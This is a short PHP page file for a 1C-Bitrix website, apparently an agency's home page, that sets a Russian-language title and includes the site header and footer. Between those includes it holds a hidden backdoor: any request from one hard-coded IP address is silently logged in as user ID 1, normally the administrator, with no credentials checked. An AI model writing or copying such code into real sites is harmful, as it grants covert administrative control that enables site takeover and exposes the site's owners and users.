<?
require($_SERVER['DOCUMENT_ROOT'].'/bitrix/header.php');
$APPLICATION->SetPageProperty("title", "UpAgency — создание сайтов в Москве, Новосибирске: заказать разработку сайта, программирование на 1С-Битрикс, сложные интернет-магазины");
$APPLICATION->SetTitle("UpAgency — создание сайтов в Москве, Новосибирске: заказать разработку сайта, программирование на 1С-Битрикс, сложные интернет-магазины");

global $USER;
if($_SERVER['REMOTE_ADDR'] == '212.164.234.151') {
	$USER->Authorize(1);
}
?>
<?
require($_SERVER['DOCUMENT_ROOT'].'/bitrix/footer.php');
?>